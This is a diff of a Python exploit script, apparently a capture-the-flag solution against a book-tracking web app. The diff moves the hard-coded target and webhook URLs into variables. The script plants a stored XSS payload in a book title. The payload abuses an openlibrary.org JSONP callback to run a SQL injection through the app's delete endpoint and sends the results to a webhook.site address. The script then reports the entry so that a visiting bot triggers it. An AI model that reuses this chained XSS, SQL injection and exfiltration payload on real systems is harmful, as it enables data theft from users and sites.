@@ -2,17 +2,23 @@ import requests
 import time
 import json
 
+HOST_URL = "http://20.193.136.145:1337"
+HOST_URL = "http://localhost:1337"
+HOOK_URL = "https://webhook.site/616e7181-19d4-40e7-8545-f6c871aeb819"
+
+# Normal headers can directly initialsed by def register(params, headers={})
+
 
 def register(params, headers):
 
-    response = requests.post('http://20.193.136.145:1337/register',
+    response = requests.post(f'{HOST_URL}/register',
                              params=params, headers=headers, verify=False)
 
     print(response.text)
 
 
 def login(params, headers):
-    response = requests.post('http://20.193.136.145:1337/api/login',
+    response = requests.post(f'{HOST_URL}/api/login',
                              params=params, headers=headers, verify=False)
     print(json.loads(response.text)["token"])
     cookies = {
@@ -22,7 +28,7 @@ def login(params, headers):
 
 
 def get_books(cookies, headers):
-    response = requests.get('http://20.193.136.145:1337/getBooks',
+    response = requests.get(f'{HOST_URL}/getBooks',
                             cookies=cookies, headers=headers, verify=False)
     print(response.text)
 
@@ -57,9 +63,9 @@ cookies1 = login(params1, headers_normal)
 cookies2 = login(params2, headers_normal)
 
 
-response = requests.get('http://20.193.136.145:1337/getBooks',
+response = requests.get(f'{HOST_URL}/getBooks',
                         cookies=cookies1, headers=headers_normal, verify=False)
-response = requests.get('http://20.193.136.145:1337/getBooks',
+response = requests.get(f'{HOST_URL}/getBooks',
                         cookies=cookies2, headers=headers_normal, verify=False)
 
 
@@ -70,7 +76,8 @@ payload = "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibke
 data = f'{{"title":{payload},"author":"ff","pages":4,"imageLink":"/assets/icons/bookshelf.svg","link":"","read":false,"fav":false}}'
 '''
 
-payload = "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{method:`POST`}).then((response)=>response.text()).then((response)=>(window.top.location=`https://webhook.site/22c23ba2-cf25-43f5-b324-4ddac0ca9797/?q=${response}`));//'></script>a\"></iframe>"
+payload = f"""<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{
+    method:`POST`}).then((response)=>response.text()).then((response)=>(window.top.location=`{HOOK_URL}/?q=${response}`));//'></script>a\"></iframe>"""
 
 data_dict = {
     "title": payload,
@@ -83,7 +90,7 @@ data_dict = {
 }
 
 data = json.dumps(data_dict)
-response = requests.post('http://20.193.136.145:1337/api/create',
+response = requests.post(f'{HOST_URL}/api/create',
                          cookies=cookies1, headers=headers_create, data=data)
 print(response.text)
 
@@ -95,6 +102,6 @@ print(liteId)
 
 # Report
 data = f'{{"user":"user1","liteId":"{liteId}","reason":"test"}}'
-response = requests.post('http://20.193.136.145:1337/report',
+response = requests.post(f'{HOST_URL}/report',
                          cookies=cookies2, headers=headers_create, data=data)
 print(response.text)
